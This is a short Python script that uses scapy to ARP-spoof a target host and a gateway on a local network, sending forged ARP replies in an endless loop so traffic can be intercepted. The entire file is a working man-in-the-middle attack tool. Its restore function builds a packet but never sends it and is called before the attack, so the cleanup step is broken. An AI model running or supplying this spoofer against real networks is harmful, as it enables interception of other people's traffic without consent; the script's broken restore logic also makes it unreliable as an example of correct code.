#!/usr/bin/env python
from termcolor import colored, cprint
import scapy.all as scapy
from time import sleep
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    

restore('192.168.0.105', '192.168.0.1')

try :
    COUNTER = 0
    while True:
        spoof('192.168.0.105', '192.168.0.1')
        spoof('192.168.0.1', '192.168.0.105')
        COUNTER += 2
        TEXT = colored(COUNTER, 'green', attrs=['blink'])
        print(f'\rSent packets : {TEXT}', end='')
        sys.stdout.flush()
        sleep(2)
except KeyboardInterrupt:
    print('\n[red]Has finished.')